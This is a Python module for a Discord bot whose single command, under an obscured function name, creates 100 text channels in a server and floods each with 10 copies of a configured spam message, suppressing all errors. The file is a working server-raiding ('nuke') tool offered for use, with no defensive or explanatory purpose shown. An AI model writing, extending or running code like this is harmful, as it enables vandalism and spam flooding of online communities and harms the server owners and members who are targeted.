import discord
import asyncio
import random
from core.g._78 import _78

async def _10(ctx):
    if not ctx.guild.me.guild_permissions.manage_channels:
        await ctx.send("BOT NEEDS MANAGE CHANNELS PERMISSION", delete_after=3)
        return
    await ctx.send("CREATING CHANNELS AND SPAMMING", delete_after=2)
    for i in range(100):
        if _78.USE_RANDOM and _78.CHANNEL_NAMES:
            name = random.choice(_78.CHANNEL_NAMES)
        else:
            name = _78.CHANNEL_NAME
        try:
            channel = await ctx.guild.create_text_channel(name)
            for j in range(10):
                try:
                    await channel.send(_78.SPAM_MSG)
                except:
                    pass
        except:
            pass
    await ctx.send("CREATED 100 CHANNELS AND SPAMMED 10 MESSAGES EACH")
